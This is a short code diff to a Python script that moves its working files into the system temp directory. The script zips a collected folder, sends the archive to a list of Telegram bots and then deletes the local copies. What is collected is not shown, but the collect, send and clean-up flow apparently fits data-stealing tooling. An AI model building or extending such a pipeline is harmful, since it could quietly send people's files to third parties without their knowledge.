@@ -2,6 +2,7 @@ import asyncio
 import logging
 import os
 import sys
+import tempfile
 from typing import Any, Callable, Dict, List
 
 from config.settings_v2 import settings
@@ -128,11 +129,13 @@ if __name__ == "__main__":
     logging.info("Starting main process...")
     process_platform("windows" if sys.platform == "win32" else "ubuntu")
 
-    directories: List[str] = ["temp/"]
-    zip_file: str = "data.zip"
+    temp_dir = tempfile.gettempdir()
+
+    directories: List[str] = [os.path.join(temp_dir, "temp")]
+    zip_file: str = os.path.join(temp_dir, "data.zip")
     compress_folders_and_files(directories=directories, zip_file=zip_file)
 
-    documents: List[str] = ["data.zip"]
+    documents: List[str] = [os.path.join(temp_dir, "data.zip")]
     list_bot_settings: List[Dict[str, str]] = settings["tele"]["list_bot"]
 
     list_bot = ListBot()
@@ -142,5 +145,7 @@ if __name__ == "__main__":
 
     asyncio.run(list_bot.send_information(documents=documents))
 
-    remove_files_and_folders(paths=["temp", "data.zip"])
+    remove_files_and_folders(
+        paths=[os.path.join(temp_dir, "temp"), os.path.join(temp_dir, "data.zip")]
+    )
     logging.info("Main process completed.")
